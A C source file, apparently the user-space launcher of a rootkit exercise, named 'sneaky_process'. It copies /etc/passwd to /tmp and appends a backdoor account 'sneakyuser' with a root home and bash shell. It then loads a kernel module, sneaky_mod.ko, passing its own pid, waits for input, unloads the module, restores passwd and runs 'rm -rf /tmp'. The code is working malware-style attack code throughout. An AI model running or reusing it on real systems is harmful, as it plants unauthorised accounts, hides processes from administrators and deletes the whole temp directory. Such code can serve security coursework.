#include<stdlib.h>
#include<stdio.h>
#include<unistd.h>
#include<sys/types.h>
#include<sys/wait.h>
#include<string.h>
int main()
{
  // part1: print pid for process
  printf("sneaky_process pid = %d\n", getpid());

  // part2: copy passwd to new dir, and insert malicious info in original dir  
  char cmd0[128];
  char cmd1[128];
  char cmd2[128];
  strcpy(cmd0, "mkdir /tmp");
  strcpy(cmd1, "cp /etc/passwd /tmp");
  // strcpy(cmd1, "rsync -r /etc/passwd /tmp/passwd");
  strcpy(cmd2, "echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> /etc/passwd");
  system(cmd0);
  system(cmd1);
  system(cmd2);

  // part3: insmod our sneaky_mod, report "insertion" when syscall is done
  int pid=(int)getpid();
  char cmd3[128];
  sprintf(cmd3, "insmod sneaky_mod.ko pid=%d", pid);
  system(cmd3);
  //system("lsmod | grep sneaky_mod.ko");
  printf("insertion\n");

  // part4: wait for quiting 
  char input;
  while((input = getchar())!='q')
    {}

  // part5: rmmod our sneaky_mod, report "deletion" when syscall is done
  char cmd4[128];
  //strcpy(cmd4, "rmmod sneaky_mod.ko");
  strcpy(cmd4, "rmmod sneaky_mod.ko");
  system(cmd4);
  printf("deletion\n");
  //system("lsmod | grep sneaky_mod.ko");

  // part6: restore the passwd file, delete tmp dir 
  //char *file = "/tmp/passwd";
  char cmd5[128];
  char cmd6[128];
  //strcpy(cmd5, "cp /tmp/passwd /etc/passwd");
  strcpy(cmd5, "cp /tmp/passwd /etc/passwd");
  //strcpy(cmd5, "rsync -r /tmp/passwd /etc/passwd");
  strcpy(cmd6, "rm -rf /tmp");
  system(cmd5);
  system(cmd6);
  
  return 0;
  }
